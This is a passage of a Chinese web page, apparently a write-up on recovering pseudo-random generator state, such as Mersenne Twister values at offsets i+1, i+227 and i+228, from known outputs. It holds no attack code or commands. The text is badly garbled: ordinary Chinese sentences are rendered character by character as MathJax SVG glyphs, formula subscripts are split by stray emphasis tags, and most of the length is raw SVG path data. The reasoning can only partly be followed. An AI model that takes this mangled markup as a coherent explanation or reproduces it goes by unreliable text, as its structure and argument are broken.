transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(4000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">以</text></g><g data-mml-node="mi" transform="translate(5000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">及</text></g></g></g></svg></mjx-container>I</em>{i+227}<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="47.511ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 21000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">最</text></g><g data-mml-node="mi" transform="translate(2000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">高</text></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(4000,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(5000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">那</text></g><g data-mml-node="mi" transform="translate(6000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">么</text></g><g data-mml-node="mi" transform="translate(7000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">现</text></g><g data-mml-node="mi" transform="translate(8000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">在</text></g><g data-mml-node="mi" transform="translate(9000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">如</text></g><g data-mml-node="mi" transform="translate(10000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">果</text></g><g data-mml-node="mi" transform="translate(11000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">知</text></g><g data-mml-node="mi" transform="translate(12000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">道</text></g><g data-mml-node="mi" transform="translate(13000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">了</text></g><g data-mml-node="mi" transform="translate(14000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">另</text></g><g data-mml-node="mi" transform="translate(15000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">一</text></g><g data-mml-node="mi" transform="translate(16000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">对</text></g><g data-mml-node="mi" transform="translate(17000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">状</text></g><g data-mml-node="mi" transform="translate(18000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">态</text></g><g data-mml-node="mi" transform="translate(19000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(20000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">值</text></g></g></g></svg></mjx-container>(S<em>{i+1},\ S</em>{i+228})<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="15.837ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 7000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">我</text></g><g data-mml-node="mi" transform="translate(2000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">们</text></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">能</text></g><g data-mml-node="mi" transform="translate(4000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">够</text></g><g data-mml-node="mi" transform="translate(5000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">恢</text></g><g data-mml-node="mi" transform="translate(6000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">复</text></g></g></g></svg></mjx-container>I<em>{i+229}<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="13.575ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 6000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">低</text></g><g data-mml-node="mn" transform="translate(2000,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"/><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"/></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(4000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">以</text></g><g data-mml-node="mi" transform="translate(5000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">及</text></g></g></g></svg></mjx-container>I</em>{i+228}<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="33.937ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 15000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">最</text></g><g data-mml-node="mi" transform="translate(2000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">高</text></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(4000,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(5000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">那</text></g><g data-mml-node="mi" transform="translate(6000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">么</text></g><g data-mml-node="mi" transform="translate(7000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">此</text></g><g data-mml-node="mi" transform="translate(8000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">时</text></g><g data-mml-node="mi" transform="translate(9000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">我</text></g><g data-mml-node="mi" transform="translate(10000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">们</text></g><g data-mml-node="mi" transform="translate(11000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">就</text></g><g data-mml-node="mi" transform="translate(12000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">能</text></g><g data-mml-node="mi" transform="translate(13000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">获</text></g><g data-mml-node="mi" transform="translate(14000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">得</text></g></g></g></svg></mjx-container>I_{i+228}$ 的精确数值</p><p>那么现在继续添加一组会发生什么？添加 $(S<em>{i+2},\ S</em>{i+229})<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="11.312ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 5000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">我</text></g><g data-mml-node="mi" transform="translate(2000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">们</text></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">恢</text></g><g data-mml-node="mi" transform="translate(4000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">复</text></g></g></g></svg></mjx-container>I<em>{i+230}<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="13.575ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 6000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">低</text></g><g data-mml-node="mn" transform="translate(2000,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"/><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"/></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(4000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">以</text></g><g data-mml-node="mi" transform="translate(5000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">及</text></g></g></g></svg></mjx-container>I</em>{i+229}<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="38.462ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 17000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">最</text></g><g data-mml-node="mi" transform="translate(2000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">高</text></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(4000,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(5000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">我</text></g><g data-mml-node="mi" transform="translate(6000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">们</text></g><g data-mml-node="mi" transform="translate(7000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">又</text></g><g data-mml-node="mi" transform="translate(8000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">知</text></g><g data-mml-node="mi" transform="translate(9000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">道</text></g><g data-mml-node="mi" transform="translate(10000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">了</text></g><g data-mml-node="mi" transform="translate(11000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">一</text></g><g data-mml-node="mi" transform="translate(12000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">个</text></g><g data-mml-node="mi" transform="translate(13000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">当</text></g><g data-mml-node="mi" transform="translate(14000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">前</text></g><g data-mml-node="mi" transform="translate(15000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">状</text></g><g data-mml-node="mi" transform="translate(16000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">态</text></g></g></g></svg></mjx-container>I<em>{i+229}<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="31.674ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 14000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">精</text></g><g data-mml-node="mi" transform="translate(2000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">确</text></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">值</text></g><g data-mml-node="mi" transform="translate(4000,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(5000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">那</text></g><g data-mml-node="mi" transform="translate(6000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">么</text></g><g data-mml-node="mi" transform="translate(7000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">现</text></g><g data-mml-node="mi" transform="translate(8000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">在</text></g><g data-mml-node="mi" transform="translate(9000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">我</text></g><g data-mml-node="mi" transform="translate(10000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">们</text></g><g data-mml-node="mi" transform="translate(11000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">有</text></g><g data-mml-node="mi" transform="translate(12000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">状</text></g><g data-mml-node="mi" transform="translate(13000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">态</text></g></g></g></svg></mjx-container>I</em>{i+228}<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 1000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g></g></g></svg></mjx-container>I<em>{i+229}<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 1000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g></g></g></svg></mjx-container>I</em>{i+230}<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="91.629ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 40500 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">低</text></g><g data-mml-node="mn" transform="translate(2000,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"/><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"/></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(4000,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(5000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">我</text></g><g data-mml-node="mi" transform="translate(6000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">们</text></g><g data-mml-node="mi" transform="translate(7000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">就</text></g><g data-mml-node="mi" transform="translate(8000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">可</text></g><g data-mml-node="mi" transform="translate(9000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">以</text></g><g data-mml-node="mi" transform="translate(10000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">说</text></g><g data-mml-node="mi" transform="translate(11000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">我</text></g><g data-mml-node="mi" transform="translate(12000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">们</text></g><g data-mml-node="mi" transform="translate(13000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">拥</text></g><g data-mml-node="mi" transform="translate(14000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">有</text></g><g data-mml-node="mi" transform="translate(15000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">了</text></g><g data-mml-node="mn" transform="translate(16000,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"/></g><g data-mml-node="mi" transform="translate(16500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">个</text></g><g data-mml-node="mi" transform="translate(17500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">初</text></g><g data-mml-node="mi" transform="translate(18500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">始</text></g><g data-mml-node="mi" transform="translate(19500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">状</text></g><g data-mml-node="mi" transform="translate(20500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">态</text></g><g data-mml-node="mi" transform="translate(21500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">连</text></g><g data-mml-node="mi" transform="translate(22500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">续</text></g><g data-mml-node="mi" transform="translate(23500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">值</text></g><g data-mml-node="mi" transform="translate(24500,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(25500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">我</text></g><g data-mml-node="mi" transform="translate(26500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">们</text></g><g data-mml-node="mi" transform="translate(27500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">又</text></g><g data-mml-node="mi" transform="translate(28500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">可</text></g><g data-mml-node="mi" transform="translate(29500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">以</text></g><g data-mml-node="mi" transform="translate(30500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">利</text></g><g data-mml-node="mi" transform="translate(31500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">用</text></g><g data-mml-node="mi" transform="translate(32500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">这</text></g><g data-mml-node="mi" transform="translate(33500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">种</text></g><g data-mml-node="mi" transform="translate(34500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">方</text></g><g data-mml-node="mi" transform="translate(35500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">式</text></g><g data-mml-node="mi" transform="translate(36500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">恢</text></g><g data-mml-node="mi" transform="translate(37500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">复</text></g><g data-mml-node="mi" transform="translate(38500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">两</text></g><g data-mml-node="mi" transform="translate(39500,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">个</text></g></g></g></svg></mjx-container>K<em>j<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="18.1ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 8000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">潜</text></g><g data-mml-node="mi" transform="translate(2000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">在</text></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">值</text></g><g data-mml-node="mi" transform="translate(4000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">了</text></g><g data-mml-node="mi" transform="translate(5000,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">（</text></g><g data-mml-node="mi" transform="translate(6000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">因</text></g><g data-mml-node="mi" transform="translate(7000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">为</text></g></g></g></svg></mjx-container>I</em>{i+230}$最高位值不确定）</p><p>==注：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.471ex;" xmlns="http://www.w3.org/2000/svg" width="5.38ex" height="2.016ex" role="img" focusable="false" viewbox="0 -683 2377.7 891"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g><g data-mml-node="TeXAtom" transform="translate(473,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 